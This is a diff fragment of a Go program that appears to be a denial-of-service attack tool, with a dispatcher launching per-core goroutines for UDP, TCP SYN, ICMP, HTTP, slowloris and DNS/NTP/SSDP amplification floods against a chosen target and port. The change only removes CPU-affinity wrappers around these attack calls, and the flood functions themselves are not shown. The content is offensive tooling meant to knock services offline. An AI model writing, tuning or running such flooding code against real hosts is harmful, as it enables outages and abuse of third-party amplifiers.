@@ -600,50 +600,32 @@ func main() {
 	case "udp":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go func(cpu int) {
-				setCPUAffinity(cpu)
-				udpSendmmsg(*target, *port, perCore, *packet, dur, stopCh, &wg)
-			}(i)
+			go udpSendmmsg(*target, *port, perCore, *packet, dur, stopCh, &wg)
 		}
 	case "tcp", "syn":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go func(cpu int) {
-				setCPUAffinity(cpu)
-				tcpSynFlood(*target, *port, perCore, dur, stopCh, &wg)
-			}(i)
+			go tcpSynFlood(*target, *port, perCore, dur, stopCh, &wg)
 		}
 	case "icmp":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go func(cpu int) {
-				setCPUAffinity(cpu)
-				icmpFlood(*target, perCore, dur, stopCh, &wg)
-			}(i)
+			go icmpFlood(*target, perCore, dur, stopCh, &wg)
 		}
 	case "http", "cc":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go func(cpu int) {
-				setCPUAffinity(cpu)
-				httpFlood(*target, *port, perCore, *path, dur, stopCh, &wg)
-			}(i)
+			go httpFlood(*target, *port, perCore, *path, dur, stopCh, &wg)
 		}
 	case "slowloris":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go func(cpu int) {
-				setCPUAffinity(cpu)
-				slowloris(*target, *port, perCore, dur, stopCh, &wg)
-			}(i)
+			go slowloris(*target, *port, perCore, dur, stopCh, &wg)
 		}
 	case "dns", "ntp", "ssdp":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go func(cpu int) {
-				setCPUAffinity(cpu)
-				ampFlood(*target, *port, *mode, perCore, dur, stopCh, &wg)
-			}(i)
+			go ampFlood(*target, *port, *mode, perCore, dur, stopCh, &wg)
 		}
 	default:
 		fmt.Println("未知模式:", *mode)
